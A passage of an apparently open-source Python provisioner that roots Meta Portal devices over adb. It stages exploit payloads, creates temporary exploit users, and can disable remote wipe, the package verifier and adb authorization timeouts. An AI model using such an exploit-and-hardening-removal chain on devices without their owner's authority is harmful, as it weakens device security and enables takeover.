#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
# Originally by Xavier Larrea (jxlarrea); modified by itsgreat2misha.
# See LICENSE and NOTICE.

"""Inspect, provision, recover, and verify supported Meta Portal devices."""

from __future__ import annotations

import argparse
import collections
import contextlib
import datetime as dt
import hashlib
import json
import os
import pathlib
import re
import select
import shlex
import shutil
import socket
import subprocess
import sys
import tarfile
import tempfile
import time
import urllib.request
import zipfile

if sys.version_info < (3, 9):
    raise SystemExit(
        "PROVISION_ERROR: Python 3.9 or newer is required; "
        f"running {sys.version_info.major}.{sys.version_info.minor}"
    )

from meta_debloat_components import (
    DEBLOAT_COMPONENT_PROFILES,
    DEBLOAT_COMPONENTS,
    DEBLOAT_COMPONENT_NAMES,
)
from portal_targets import PortalTarget, find_target
from device_session import DeviceSession, ProvisionError, run_command
from run_state import STATE_REMOTE, RunState
from cli import CliConfig, main as _cli_main, parse_args as _cli_parse_args
from features.settings import (
    DEBLOAT_BACKUP_REMOTE,
    DEBLOAT_COMPONENT_ACTIONS_REMOTE,
    DEBLOAT_COMPONENT_BACKUP_REMOTE,
    DEBLOAT_PACKAGES,
    META_ACCOUNT_BACKUP_REMOTE,
    META_ACCOUNT_LOCAL_CLEAN_REMOTE,
    META_ACCOUNT_TYPES,
    META_AUTHENTICATOR_COMPONENTS,
    META_HARDWARE_AUTHENTICATOR,
    PRIVACY_BACKUP_REMOTE,
    REMOTE_WIPE_BACKUP_REMOTE,
    REMOTE_WIPE_COMPONENTS,
    SELF_MANAGED_DEBLOAT_COMPONENTS,
    SettingsConfig,
    SettingsFeature,
    component_override_set,
    parse_component_backup,
    parse_debloat_backup,
    parse_remote_wipe_backup,
    restore_component_action,
)
from features.presence import (
    CAMERA_LIGHT_HELPER_REMOTE,
    CAMERA_LIGHT_HOOK_REMOTE,
    CAMERA_LIGHT_INSTALLED_REMOTE,
    CAMERA_LIGHT_RESTORED_REMOTE,
    CAMERA_SERVICE_COMPONENT,
    PRESENCE_ANALYSIS_FRAME_MARKER,
    PRESENCE_HELPER_LOCAL,
    PRESENCE_HELPER_PACKAGE,
    PRESENCE_INSTALLED_REMOTE,
    PRESENCE_KEY_REMOTE,
    PRESENCE_LOGCAT_REGEX,
    PRESENCE_LOG_MARKER,
    PRESENCE_PROFILE_KEYS,
    PRESENCE_PROFILE_SETTINGS,
    PRESENCE_ROI_FRAME_MARKER,
    PRESENCE_SAVED_KEY_REMOTE,
    PRESENCE_WIDE_FRAME_MARKER,
    SYSTEM_THEME_CONTROL_MARKER,
    SYSTEM_THEME_PROPERTY,
    SYSTEM_THEME_SETTING,
    PresenceConfig,
    PresenceFeature,
    presence_full_scene_active,
)
from features.audio import (
    MHA_AUDIO_VERIFIED_LOG,
    MHA_TUNING_BACKUP_REMOTE,
    MHA_TUNING_DEVICE,
    MHA_TUNING_PATCHED_REMOTE,
    MHA_TUNING_STOCK_REMOTE,
    VOICE_AUDIO_VERIFIED_LOG,
    AudioFeature,
    audio_processing_disabled_observed,
)
from features.shizuku import (
    SHIZUKU_APK_NAME,
    SHIZUKU_APK_SHA256,
    SHIZUKU_APK_URL,
    SHIZUKU_HELPER_LOCAL,
    SHIZUKU_HELPER_PACKAGE,
    SHIZUKU_KEY_REMOTE,
    SHIZUKU_PACKAGE,
    SHIZUKU_SAVED_KEY_REMOTE,
    SHIZUKU_VERSION,
    ShizukuFeature,
)
from features.payload import (
    AUTOROOT_CONF_REMOTE,
    AUTOROOT_HELPER_LOCAL,
    AUTOROOT_HELPER_PACKAGE,
    AUTOROOT_MAX_ATTEMPTS,
    AUTOROOT_REMOTE_DIR,
    AUTOROOT_RUNNER_LOCAL,
    AUTOROOT_SESSION_WINDOW_SEC,
    CUSTOM_PAYLOAD_DST_REMOTE,
    CUSTOM_PAYLOAD_PORT,
    EXPLOIT_SENTINEL_LOCAL,
    EXPLOIT_SENTINEL_PACKAGE,
    UID1000_RUNTIME_APK_LOCAL,
    UID1000_RUNTIME_PACKAGE,
    PayloadConfig,
    PayloadFeature,
)


ROOT = pathlib.Path(__file__).resolve().parents[1]
# Single source of truth for the provisioner version. Release tags must
# read "v" + this string (the release workflow enforces the match).
# The "-dev" suffix marks an untagged development state; it is dropped
# in the commit that cuts a release.
PROVISIONER_VERSION = "1.0.0-dev"
PROJECT_URL = "https://github.com/itsgreat2misha/portal-root-kiosk-satellite"
ANDROID_NDK_VERSION = "28.2.13676358"
ANDROID_BUILD_TOOLS_VERSION = "37.0.0"
ANDROID_PLATFORM_VERSION = "android-36"
PROVISIONER_BANNER = rf"""
+----------------------------------------------------------------+
|                                                                |
|                  Meta Portal Root Provisioner                  |
|                                                                |
|                    Created by Xavier Larrea                    |
| {PROJECT_URL}  |
|                                                                |
+----------------------------------------------------------------+
""".strip()
HELPER_LOCAL = ROOT / "helper/build/libportal_audio_persist.so"
HELPER_JAVA_LOCAL = ROOT / "helper/build/libportal_audio_persist_java.so"
PRELOAD_REMOTE = "/data/local/tmp/preload-portal.so"
DEFAULT_CUSTOM_PAYLOAD_LOCAL = ROOT / "root-daemon" / "portal-root-daemon"
CUSTOM_PAYLOAD_REMOTE = "/data/local/tmp/portal-root-daemon"
HELPER_REMOTE = "/data/local/tmp/libportal_audio_persist.so"
AUDIO_CTL_LOCAL = ROOT / "exploit/build/portal-audio-ctl.jar"
AUDIO_CTL_REMOTE = "/data/local/tmp/portal-audio-ctl.jar"
ACCOUNT_CTL_LOCAL = ROOT / "exploit/build/portal-account-ctl.jar"
ACCOUNT_CTL_REMOTE = "/data/local/tmp/portal-account-ctl.jar"
COMPONENT_CTL_LOCAL = ROOT / "exploit/build/portal-component-ctl.jar"
COMPONENT_CTL_REMOTE = "/data/local/tmp/portal-component-ctl.jar"
APP_VERIFIER_BACKUP_REMOTE = "/data/local/tmp/portal-package-verifier-before-v1"
APP_VERIFIER_PACKAGE = "com.facebook.appverifier"
ADB_ENABLED_SETTING = "adb_enabled"
ADB_AUTH_TIMEOUT_SETTING = "adb_allowed_connection_time"
ADB_AUTH_TIMEOUT_BACKUP_REMOTE = (
    "/data/local/tmp/portal-adb-auth-timeout-before-v1.json"
)
PACKAGE_STATE_SETTLE_SECONDS = 15
OTA_UI_PACKAGE = "com.facebook.aloha.otaui"
OTA_SETUP_PACKAGE = "com.facebook.aloha.alohaotasetup"
DEFAULT_UID1000_HOST_PACKAGE = "com.facebook.alohasdk.platformbatterystate"
WIRELESS_ADB_INSTALLED_REMOTE = (
    "/data/local/tmp/portal-wireless-adb-installed-v1"
)
ADB_FRAMEWORK_BOOT_INSTALLED_REMOTE = (
    "/data/local/tmp/portal-adb-framework-boot-installed-v1"
)
UID1000_HOOK_ACTIVE_REMOTE = (
    "/data/local/tmp/portal-uid1000-hook-active-v1"
)
AUTOROOT_DISABLE_FLAG_REMOTE = "/data/local/tmp/portal-autoroot.disable"
# Written into the disable flag when the provisioner itself sets it, so a
# later run can tell its own leftover (a run that died before restoring)
# from a flag a user set deliberately, whose content is left untouched.
AUTOROOT_GUARD_TOKEN = "portal-provisioner-guard-v1"
# Nesting depth of the autoroot guard across PortalProvisioner instances
# in this process: bootstrap phases run nested provision() calls against
# the same device, and only the outermost run owns the flag lifecycle.
_autoroot_guard_depth = 0


def print_banner() -> None:
    print(PROVISIONER_BANNER, file=sys.stderr, flush=True)


class PortalProvisioner:
    def __init__(
        self,
        serial: str,
        attempts: int,
        log_dir: pathlib.Path,
        audio: bool = False,
        restore_audio: bool = False,
        disable_updates: bool = False,
        enable_updates: bool = False,
        debloat: bool = False,
        restore_bloat: bool = False,
        block_remote_wipe: bool = False,
        restore_remote_wipe: bool = False,
        remove_meta_accounts: bool = False,
        optimize_presence: bool = False,
        restore_presence_profile: bool = False,
        presence_fps_cap: int | None = None,
        restore_presence_fps: bool = False,
        privacy_dns: str | None = None,
        dhcp_dns: bool = False,
        restore_privacy_dns: bool = False,
        allow_app_updates: bool = False,
        restore_app_verifier: bool = False,
        shizuku: bool = False,
        remove_shizuku: bool = False,
        disable_camera_light: bool = False,
        restore_camera_light: bool = False,
        system_theme_control: str | None = None,
        shizuku_apk: pathlib.Path | None = None,
        custom_payload: pathlib.Path | None = None,
        skip_shizuku_root: bool = False,
        autoroot: bool = False,
        verify_boots: int = 1,
        status_only: bool = False,
        dry_run: bool = False,
        backup_path: pathlib.Path | None = None,
        recover: bool = False,
        skip_build: bool = False,
        persistent_wireless_adb: bool = False,
        disable_adb_auth_timeout: bool = False,
        restore_adb_auth_timeout: bool = False,
        wireless_adb_only: bool = False,
        adb_framework_only: bool = False,
        meta_accounts_local_only: bool = False,
        meta_accounts_auth_only: bool = False,
        meta_accounts_finalize_only: bool = False,
    ):
        self.serial = serial
        self.attempts = attempts
        self.log_dir = log_dir
        self.audio = audio
        self.audio_already_configured = False
        self.deferred_phase_failures: list[str] = []
        self.mha_tuning_stock_local: pathlib.Path | None = None
        self.mha_tuning_patched_local: pathlib.Path | None = None
        self.restore_audio = restore_audio
        self.disable_updates = disable_updates
        self.ota_already_configured = False
        self.enable_updates = enable_updates
        self.debloat = debloat
        self.debloat_already_configured = False
        self.restore_bloat = restore_bloat
        self.block_remote_wipe = block_remote_wipe
        self.remote_wipe_already_configured = False
        self.restore_remote_wipe = restore_remote_wipe
        self.remove_meta_accounts = remove_meta_accounts
        self.meta_accounts_absent = False
        self.meta_accounts_already_clean = False
        self.optimize_presence = optimize_presence
        self.presence_already_configured = False
        self.restore_presence_profile = restore_presence_profile
        self.presence_fps_cap = presence_fps_cap
        self.presence_fps_already_configured = False
        self.restore_presence_fps = restore_presence_fps
        self.privacy_dns = privacy_dns
        self.dhcp_dns = dhcp_dns
        self.restore_privacy_dns = restore_privacy_dns
        self.allow_app_updates = allow_app_updates
        self.restore_app_verifier = restore_app_verifier
        self.shizuku = shizuku
        self.remove_shizuku = remove_shizuku
        # True while apply_custom_payload() runs its attempt loop (and
        # the post-payload steps it invokes). In that phase the exploit
        # environment must NOT carry the Shizuku key-authorization
        # action; see build_exploit_environment().
        self._in_custom_payload_phase = False
        self.disable_camera_light = disable_camera_light
        self.restore_camera_light = restore_camera_light
        self.system_theme_control = system_theme_control
        self.system_theme_control_already_configured = False
        self.system_theme_control_runtime_verified = False
        self.system_theme_control_log_count_before = 0
        self._autoroot_guard_prior: str | None = None
        self._autoroot_guard_nested = False
        self.shizuku_apk = shizuku_apk
        self.custom_payload = custom_payload
        self.skip_shizuku_root = skip_shizuku_root
        self.autoroot = autoroot
        self.verify_boots = verify_boots
        self.audio_feature = AudioFeature(
            adb_run=lambda args, timeout=None, check=False: self.adb_run(
                args, timeout=timeout, check=check
            ),
            pull_file=lambda remote, local: self.pull_file(remote, local),
            logcat_watermark=lambda: self.logcat_watermark(),
            logcat_poll=lambda tag, since, timeout=10: self.logcat_poll(
                tag, since, timeout=timeout
            ),
            log_dir=log_dir,
            target=lambda: self.target,
            restore_audio=lambda: self.restore_audio,
        )
        self.payload_feature = PayloadFeature(
            config=lambda: PayloadConfig(
                shizuku=self.shizuku,
                skip_shizuku_root=self.skip_shizuku_root,
                autoroot=self.autoroot,
                disable_camera_light=self.disable_camera_light,
                restore_camera_light=self.restore_camera_light,
                restore_presence_fps=self.restore_presence_fps,
                restore_presence_profile=self.restore_presence_profile,
                presence_fps_cap=self.presence_fps_cap,
            ),
            adb_run=lambda *a, **k: self.adb_run(*a, **k),
            target=lambda: self.target,
            install_apk_preserving_verifier=(
                lambda *a, **k: self.install_apk_preserving_verifier(*a, **k)
            ),
            verify_package_verifier_state=(
                lambda *a, **k: self.verify_package_verifier_state(*a, **k)
            ),
            settle_package_state=lambda *a, **k: self.settle_package_state(
                *a, **k
            ),
            package_sets=lambda *a, **k: self.package_sets(*a, **k),
            push_text_atomic=lambda *a, **k: self.push_text_atomic(*a, **k),
            build_exploit_environment=(
                lambda *a, **k: self.build_exploit_environment(*a, **k)
            ),
            uid1000_path=lambda *a, **k: self.uid1000_path(*a, **k),
            compile_camera_light_host_speed=(
                lambda *a, **k: self.compile_camera_light_host_speed(*a, **k)
            ),
            start_shizuku_as_root=(
                lambda *a, **k: self.start_shizuku_as_root(*a, **k)
            ),
            stage_autoroot_payload=(
                lambda *a, **k: self.stage_autoroot_payload(*a, **k)
            ),
            presence_fps_action_requested=(
                lambda: self.presence_fps_action_requested()
            ),
            stop_root_daemon=lambda *a, **k: self.stop_root_daemon(*a, **k),
            autoroot_helper_local=lambda: AUTOROOT_HELPER_LOCAL,
            autoroot_runner_local=lambda: AUTOROOT_RUNNER_LOCAL,
            adb_framework_boot_installed_remote=(
                ADB_FRAMEWORK_BOOT_INSTALLED_REMOTE
            ),
        )
        self.shizuku_feature = ShizukuFeature(
            adb_run=lambda *a, **k: self.adb_run(*a, **k),
            run=lambda *a, **k: self.run(*a, **k),
            target=lambda: self.target,
            log_dir=lambda: self.log_dir,
            settle_package_state=lambda *a, **k: self.settle_package_state(
                *a, **k
            ),
            package_sets=lambda *a, **k: self.package_sets(*a, **k),
            logcat_watermark=lambda *a, **k: self.logcat_watermark(*a, **k),
            logcat_poll=lambda *a, **k: self.logcat_poll(*a, **k),
            daemon_exec=lambda *a, **k: self.daemon_exec(*a, **k),
            resolve_shizuku_apk=lambda *a, **k: self.resolve_shizuku_apk(
                *a, **k
            ),
            install_apk_preserving_verifier=(
                lambda *a, **k: self.install_apk_preserving_verifier(*a, **k)
            ),
            verify_package_verifier_state=(
                lambda *a, **k: self.verify_package_verifier_state(*a, **k)
            ),
            shizuku_apk=self.shizuku_apk,
        )
        self.presence_feature = PresenceFeature(
            config=lambda: PresenceConfig(
                system_theme_control=self.system_theme_control,
                presence_fps_cap=self.presence_fps_cap,
            ),
            adb_run=lambda *a, **k: self.adb_run(*a, **k),
            run=lambda *a, **k: self.run(*a, **k),
            target=lambda: self.target,
            log_dir=lambda: self.log_dir,
            uid1000_path=lambda *a, **k: self.uid1000_path(*a, **k),
            install_apk_preserving_verifier=(
                lambda *a, **k: self.install_apk_preserving_verifier(*a, **k)
            ),
            verify_package_verifier_state=(
                lambda *a, **k: self.verify_package_verifier_state(*a, **k)
            ),
            settle_package_state=lambda *a, **k: self.settle_package_state(
                *a, **k
            ),
            push_text_atomic=lambda *a, **k: self.push_text_atomic(*a, **k),
            package_sets=lambda *a, **k: self.package_sets(*a, **k),
            logcat_watermark=lambda *a, **k: self.logcat_watermark(*a, **k),
            logcat_poll=lambda *a, **k: self.logcat_poll(*a, **k),
            adb_framework_boot_installed_remote=(
                ADB_FRAMEWORK_BOOT_INSTALLED_REMOTE
            ),
        )
        self.settings_feature = SettingsFeature(
            adb_run=lambda args, timeout=None, check=False: self.adb_run(
                args, timeout=timeout, check=check
            ),
            log_dir=log_dir,
            target=lambda: self.target,
            config=lambda: SettingsConfig(
                debloat=self.debloat,
                restore_bloat=self.restore_bloat,
                block_remote_wipe=self.block_remote_wipe,
                restore_remote_wipe=self.restore_remote_wipe,
                privacy_dns=self.privacy_dns,
                dhcp_dns=self.dhcp_dns,
                restore_privacy_dns=self.restore_privacy_dns,
            ),
            ensure_adb_framework_enabled=(
                lambda: self.ensure_adb_framework_enabled()
            ),
            push_text_atomic=lambda contents, remote: self.push_text_atomic(
                contents, remote
            ),
            settle_package_state=lambda before_reboot=False: (
                self.settle_package_state(before_reboot=before_reboot)
            ),
            package_sets=lambda: self.package_sets(),
            current_component_states=lambda: self.current_component_states(),
            current_named_component_states=lambda components, detect_missing=False: (
                self.current_named_component_states(
                    components, detect_missing=detect_missing
                )
            ),
            meta_accounts=lambda: self.meta_accounts(),
            disabled_meta_authenticators=(
                lambda: self.disabled_meta_authenticators()
            ),
            read_component_backup=lambda required=True: (
                self.read_component_backup(required=required)
            ),
            read_remote_wipe_backup=lambda required=True: (
                self.read_remote_wipe_backup(required=required)
            ),
            ensure_remote_wipe_backup=lambda: self.ensure_remote_wipe_backup(),
        )
        self.run_state = RunState(
            ROOT,
            run=lambda args, timeout=None: self.run(args, timeout=timeout),
            adb_run=lambda args, timeout=None, check=False: self.adb_run(
                args, timeout=timeout, check=check
            ),
            serial=serial,
            log_dir=log_dir,
        )
        if self.verify_boots not in (1, 2):
            raise ProvisionError('--verify-boots must be 1 or 2')
        self.shizuku_public_key: pathlib.Path | None = None
        self.presence_public_key: pathlib.Path | None = None
        self.uid1000_runtime_apk_remote: str | None = None
        self.uid1000_runtime_library_remote: str | None = None
        self.uid1000_runtime_package_installed = False
        self.package_verifier_before_install_disabled: bool | None = None
        self.status_only = status_only
        self.dry_run = dry_run
        self.backup_path = backup_path
        self.recover = recover
        self.skip_build = skip_build
        self.persistent_wireless_adb = persistent_wireless_adb
        self.disable_adb_auth_timeout = (
            disable_adb_auth_timeout or persistent_wireless_adb
        )
        self.restore_adb_auth_timeout = restore_adb_auth_timeout
        self.wireless_adb_only = wireless_adb_only
        self.adb_framework_only = adb_framework_only
        self.meta_accounts_local_only = meta_accounts_local_only
        self.meta_accounts_auth_only = meta_accounts_auth_only
        self.meta_accounts_finalize_only = meta_accounts_finalize_only
        self.session = DeviceSession(
            serial,
            post_boot_settle_seconds=lambda: (
                self.target.post_boot_adb_settle_seconds if self.target else 0
            ),
        )
        self.adb = self.session.adb
        self.target: PortalTarget | None = None
        self.persist_wireless_adb = False
        self.adb_framework_boot_configured = False
        self._bugreport_cache: dict[str, str] = {}
        self.exploit_user_ids_runtime: tuple[int, ...] = ()
        self.exploit_users_created: list[int] = []

    def uid1000_path(self, name: str) -> str:
        directory = (
            self.target.uid1000_data_directory
            if self.target
            else "/data/portal-uid1000"
        )
        return f"{directory}/{name}"

    def prepare_exploit_users(self) -> None:
        if self.target is None or self.target.proc_uid_sentinel != "user":
            return
        required = len(self.target.proc_uid_user_ids)
        if required == 0:
            raise ProvisionError("user sentinel target has no requested user IDs")
        listed = self.adb_run(
            ["shell", "pm", "list", "users"], timeout=20, check=True
        ).stdout
        sentinel_users = [
            (int(user_id), name)
            for user_id, name in re.findall(r"UserInfo\{(\d+):([^:}]+):", listed)
            if int(user_id) != 0 and name.startswith("PortalRootSentinel-")
        ]
        available = [user_id for user_id, _ in sentinel_users]
        self.exploit_users_created.extend(
            user_id for user_id, _ in sentinel_users
        )
        while len(available) < required:
            ordinal = len(available) + 1
            result = self.adb_run(
                ["shell", "pm", "create-user", f"PortalRootSentinel-{ordinal}"],
                timeout=30,
            )
            match = re.search(r"Success: created user id (\d+)", result.stdout)
            if result.returncode != 0 or not match:
                self.cleanup_exploit_users(best_effort=True)
                raise ProvisionError(
                    "could not create temporary Ripley exploit user: "
                    + result.stdout.strip()
                )
            user_id = int(match.group(1))
            available.append(user_id)
            self.exploit_users_created.append(user_id)
        self.exploit_user_ids_runtime = tuple(available[:required])
        print(
            "EXPLOIT_USERS_OK ids="
            + ",".join(str(user_id) for user_id in self.exploit_user_ids_runtime)
            + f" created={len(self.exploit_users_created)}",
            flush=True,
        )

    def cleanup_exploit_users(self, best_effort: bool = False) -> None:
        failures: list[str] = []
        for user_id in reversed(self.exploit_users_created):
            try:
                result = self.adb_run(
                    ["shell", "pm", "remove-user", str(user_id)], timeout=30
                )
                if result.returncode != 0 or "Success" not in result.stdout:
                    failures.append(f"{user_id}:{result.stdout.strip()}")
            except ProvisionError as exc:
                failures.append(f"{user_id}:{exc}")
        removed = len(self.exploit_users_created) - len(failures)
        self.exploit_users_created.clear()
        self.exploit_user_ids_runtime = ()
        if failures and not best_effort:
            raise ProvisionError(
                "could not remove temporary Ripley exploit users: "
                + "; ".join(failures)
            )
        print(
            f"EXPLOIT_USERS_REMOVE removed={removed} failures={len(failures)}",
            flush=True,
        )

    def debloat_component_names(self) -> tuple[str, ...]:
        return self.settings_feature.debloat_component_names()

    def unexpected_disabled_debloat_components(
            self,
            saved: dict[str, tuple[str, str]],
            current: dict[str, tuple[str, str]],
        ) -> list[str]:
        return self.settings_feature.unexpected_disabled_debloat_components(saved, current)

    def uid1000_helper_local(self) -> pathlib.Path:
        artifact = (
            self.target.uid1000_helper_artifact
            if self.target
            else "portal-camera-led-watch"
        )
        return ROOT / "uid1000-helper/build" / artifact

    def uid1000_hook_local(self) -> pathlib.Path:
        artifact = (
            self.target.uid1000_hook_artifact
            if self.target
            else "portal-uid1000-hook.bin"
        )
        return ROOT / "uid1000-helper/build" / artifact

    def validate_uid1000_payload(self) -> None:
        if self.target is None:
            raise ProvisionError(
                "target must be selected before validating UID 1000"
            )
        helper = self.uid1000_helper_local()
        hook = self.uid1000_hook_local()
        for path, label in ((helper, "helper"), (hook, "boot hook")):
            if not path.is_file() or path.stat().st_size == 0:
                raise ProvisionError(
                    f"UID-1000 {label} artifact is missing: {path}"
                )
        if self.target.uid1000_embedded_helper:
            return
        expected_path = (
            self.target.uid1000_data_directory + "/portal-camera-led-watch"
        ).encode() + b"\0"
        if expected_path not in hook.read_bytes():
            raise ProvisionError(
                "UID-1000 boot hook does not contain the target helper path; "
                "rebuild the uid1000-helper artifacts without --skip-build"
            )

    def needs_uid1000_payload(self) -> bool:
        return bool(
            self.disable_camera_light
            or self.presence_fps_action_requested()
            or self.system_theme_uid1000_action_requested()
            or self.adb_framework_boot_install_requested()
            or (
                self.persist_wireless_adb
                and self.target
                and self.target.wireless_adb_uid1000_boot
            )
            or (
                self.target
                and self.target.uid1000_embedded_helper
                and (
                    self.restore_camera_light
                    or self.restore_presence_fps
                    or self.restore_presence_profile
                )
            )
        )

    def adb_framework_boot_persistence_requested(self) -> bool:
        return bool(
            self.persistent_wireless_adb
            or self.adb_framework_only
            or self.remove_meta_accounts
            or (
                self.disable_adb_auth_timeout
                and self.privileged_requested()
            )
        )

    def adb_framework_boot_install_requested(self) -> bool:
        return bool(
            self.adb_framework_boot_persistence_requested()
            and not self.adb_framework_boot_configured
        )

    def adb_framework_boot_preflight(self) -> bool:
        configured = self.adb_run(
            ["shell", "test", "-f", ADB_FRAMEWORK_BOOT_INSTALLED_REMOTE],
            timeout=5,
        ).returncode == 0
        if self.adb_framework_boot_persistence_requested():
            print(
                "ADB_FRAMEWORK_BOOT_PREFLIGHT "
                f"configured={int(configured)} action="
                f"{'skip' if configured else 'install'}"
            )
        return configured

    def system_theme_uid1000_action_requested(self) -> bool:
        return bool(
            self.system_theme_control is not None
            and not self.system_theme_control_already_configured
            and (
                self.target is None
                or self.target.system_theme_uid1000_required
            )
        )

    def uses_native_presence_prefs(self) -> bool:
        return bool(
            self.target
            and self.target.uid1000_embedded_helper
            and (
                self.presence_fps_action_requested()
                or self.restore_presence_fps
                or self.restore_presence_profile
            )
        )

    def presence_fps_action_requested(self) -> bool:
        return bool(
            self.presence_fps_cap is not None
            and not self.presence_fps_already_configured
        )

    def needs_component_ctl(self) -> bool:
        return bool(
            (self.debloat and not self.debloat_already_configured)
            or self.restore_bloat
            or (self.block_remote_wipe and not self.remote_wipe_already_configured)
            or self.restore_remote_wipe
            or (
                (
                    self.presence_fps_action_requested()
                    or self.restore_presence_fps
                    or self.restore_presence_profile
                )
                and not self.uses_native_presence_prefs()
            )
        )

    def only_component_actions_requested(self) -> bool:
        """Return whether one exploit pass can handle every selected action."""
        actions = set(self.requested_actions())
        return bool(actions) and actions <= {
            "debloat",
            "restore_bloat",
            "block_remote_wipe",
            "restore_remote_wipe",
        }

    @staticmethod
    def run(
        args: list[str], timeout: float | None = None, check: bool = False
    ) -> subprocess.CompletedProcess[str]:
        return run_command(args, timeout=timeout, check=check)

    def adb_run(
        self, args: list[str], timeout: float | None = None, check: bool = False
    ) -> subprocess.CompletedProcess[str]:
        return self.session.adb_run(args, timeout=timeout, check=check)

    def connect(self, wait_seconds: int = 150) -> None:
        return self.session.connect(wait_seconds)

    def reboot(self) -> tuple[str, str]:
        return self.session.reboot()

    def connect_after_reboot(self, before: str, wait_seconds: int = 600) -> str:
        return self.session.connect_after_reboot(before, wait_seconds)

    def verify_target(self, require_supported: bool = True) -> PortalTarget | None:
        fingerprint = self.adb_run(
            ["shell", "getprop", "ro.build.fingerprint"], timeout=5, check=True
        ).stdout.strip()
        device = self.adb_run(
            ["shell", "getprop", "ro.product.device"], timeout=5, check=True
        ).stdout.strip()
        product_model = self.adb_run(
            ["shell", "getprop", "ro.product.model"], timeout=5, check=True
        ).stdout.strip()
        target = find_target(device, fingerprint, product_model)
        self.target = target
        if target is None and require_supported:
            raise ProvisionError(
                "unsupported firmware; refusing build-specific kernel writes\n"
                f"model: {product_model}\ndevice: {device}\n"
                f"fingerprint: {fingerprint}"
            )
        if target is None:
            print(
                f"TARGET_UNSUPPORTED serial={self.serial} "
                f"model={product_model} device={device} "
                f"fingerprint={fingerprint}"
            )
        else:
            print(
                f"TARGET_OK serial={self.serial} target={target.key} "
                f"model={product_model} device={device} fingerprint={fingerprint}"
            )
        return target

    def stage(self) -> None:
        if self.target is None:
            raise ProvisionError("target must be selected before staging")
        if self.target.device == "omni" and (
            (self.audio and not self.audio_already_configured)
            or self.restore_audio
        ):
            self.prepare_mha_tuning_payloads()
        files = [(self.target.preload_path(ROOT), PRELOAD_REMOTE)]
        if self.custom_payload is not None:
            files.append((self.custom_payload, CUSTOM_PAYLOAD_REMOTE))
        if self.audio and not self.audio_already_configured:
            helper = (
                HELPER_JAVA_LOCAL
                if self.target.audio_java_fallback
                else HELPER_LOCAL
            )
            files.append((helper, HELPER_REMOTE))
        if self.target.audio_java_fallback and (
            (self.audio and not self.audio_already_configured)
            or self.restore_audio
        ):
            files.append((AUDIO_CTL_LOCAL, AUDIO_CTL_REMOTE))
        if self.mha_tuning_stock_local and self.mha_tuning_patched_local:
            files.extend(
                (
                    (self.mha_tuning_stock_local, MHA_TUNING_STOCK_REMOTE),
                    (self.mha_tuning_patched_local, MHA_TUNING_PATCHED_REMOTE),
                )
            )
        if self.remove_meta_accounts:
            files.append((ACCOUNT_CTL_LOCAL, ACCOUNT_CTL_REMOTE))
        if self.needs_component_ctl():
            files.append((COMPONENT_CTL_LOCAL, COMPONENT_CTL_REMOTE))
        if self.shizuku:
            if self.shizuku_public_key is None:
                raise ProvisionError("Shizuku helper key was not prepared")
            files.append((self.shizuku_public_key, SHIZUKU_KEY_REMOTE))
        if self.needs_uid1000_payload():
            files.extend(
                (
                    (self.uid1000_helper_local(), CAMERA_LIGHT_HELPER_REMOTE),
                    (self.uid1000_hook_local(), CAMERA_LIGHT_HOOK_REMOTE),
                )
            )
        for local, remote in files:
            if not local.is_file() or local.stat().st_size == 0:
                raise ProvisionError(f"missing build output: {local}")
            self.adb_run(["push", str(local), remote], timeout=30, check=True)
            mode = (
                "0644"
                if remote in (
                    SHIZUKU_KEY_REMOTE,
                    MHA_TUNING_STOCK_REMOTE,
                    MHA_TUNING_PATCHED_REMOTE,
                )
                else "0755"
            )
            self.adb_run(["shell", "chmod", mode, remote], timeout=5, check=True)
        staged = f"preload={PRELOAD_REMOTE}"
        if self.custom_payload is not None:
            staged += f" custom_payload={CUSTOM_PAYLOAD_REMOTE}"
        if self.audio and not self.audio_already_configured:
            staged += f" helper={HELPER_REMOTE}"
        if AUDIO_CTL_REMOTE in {remote for _, remote in files}:
            staged += f" audio_ctl={AUDIO_CTL_REMOTE}"
        if MHA_TUNING_PATCHED_REMOTE in {remote for _, remote in files}:
            staged += f" mha_tuning={MHA_TUNING_PATCHED_REMOTE}"
        if self.remove_meta_accounts:
            staged += f" account_ctl={ACCOUNT_CTL_REMOTE}"
        if COMPONENT_CTL_REMOTE in {remote for _, remote in files}:
            staged += f" component_ctl={COMPONENT_CTL_REMOTE}"
        if self.shizuku:
            staged += f" shizuku_key={SHIZUKU_KEY_REMOTE}"
        if self.needs_uid1000_payload():
            staged += (
                f" uid1000_helper={CAMERA_LIGHT_HELPER_REMOTE}"
                f" uid1000_hook={CAMERA_LIGHT_HOOK_REMOTE}"
            )
        print(f"STAGED {staged}")

    def pull_file(self, remote: str, local: pathlib.Path) -> bytes:
        local.parent.mkdir(parents=True, exist_ok=True)
        result = self.adb_run(
            ["pull", remote, str(local)], timeout=30
        )
        if result.returncode != 0 or not local.is_file():
            raise ProvisionError(
                f"could not pull required device file {remote}: "
                f"{result.stdout.strip()}"
            )
        return local.read_bytes()

    def prepare_mha_tuning_payloads(self) -> None:
        stock, patched = self.audio_feature.prepare_mha_tuning_payloads()
        self.mha_tuning_stock_local = stock
        self.mha_tuning_patched_local = patched

    # ---- autoroot re-run guard -------------------------------------
    #
    # A device that already carries the staged autoroot wakes it on
    # boots and helper events during a later provision run, and the
    # on-device session then race-reboots the device under the host's
    # own discovery (Run 32). Gate runs used to set the autoroot
    # disable flag by hand before starting; the provisioner now owns
    # that lifecycle itself so a plain re-run is safe: the flag is set
    # before any phase that can reboot or race (the --recover flow
    # included, since it falls through into the same phases), and the
    # state it found is restored on every exit path.

    def _autoroot_flag_present(self) -> bool:
        result = self.adb_run(
            ["shell", "test", "-f", AUTOROOT_DISABLE_FLAG_REMOTE],
            timeout=15,
        )
        if result.returncode == 0:
            return True
        if result.stdout.strip().startswith("error:"):
            raise ProvisionError(
                "adb transport error checking the autoroot disable "
                f"flag: {result.stdout.strip()}"
            )
        return False

    def _engage_autoroot_guard(self) -> None:
        global _autoroot_guard_depth
        if _autoroot_guard_depth:
            # A bootstrap phase's nested provision() on the same
            # device: the outermost run owns the flag lifecycle.
            _autoroot_guard_depth += 1
            self._autoroot_guard_nested = True
            return
        prior = "present"
        leftover = False
        if not self._autoroot_flag_present():
            prior = "absent"
        else:
            content = self.adb_run(
                ["shell", "cat", AUTOROOT_DISABLE_FLAG_REMOTE],
                timeout=15,
            ).stdout.strip()
            if content == AUTOROOT_GUARD_TOKEN:
                # A previous run died before restoring (host process
                # killed, or the device went dark): the flag is the
                # provisioner's own, not a user's deliberate setting.
                prior = "absent"
                leftover = True
        if prior == "absent":
            self.adb_run(
                [
                    "shell",
